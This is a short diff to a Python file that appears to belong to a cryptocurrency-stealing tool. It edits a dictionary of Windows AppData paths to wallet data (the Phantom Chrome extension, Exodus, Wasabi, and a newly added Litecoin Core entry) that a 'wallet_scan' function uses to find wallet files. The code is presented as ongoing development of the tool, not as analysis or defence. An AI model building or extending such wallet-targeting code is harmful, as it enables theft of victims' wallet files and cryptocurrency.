@@ -31,14 +31,15 @@ paths = {
     r'Local\Google\Chrome\User Data\Default\Local Extension Settings\bfnaelmomeimhlpmgjnjophhpkkoljpa' : 'Phantom (Chrome)',
 
     r'Roaming\Exodus\Partitions\main\Cache\Cache_Data': 'Exodus Wallet',
-    r'Roaming\WalletWasabi\Client\Wallets':'Wallet Wasabi'
+
+    r'Roaming\WalletWasabi\Client\Wallets':'Wallet Wasabi',
+
+    r'Roaming\Litecoin\wallets': 'Litecoin Core'
 }
 
 
 def wallet_scan():
     try:
-
-        listtest = []
 
         appdata_dir = controller.config.APPDATA
 
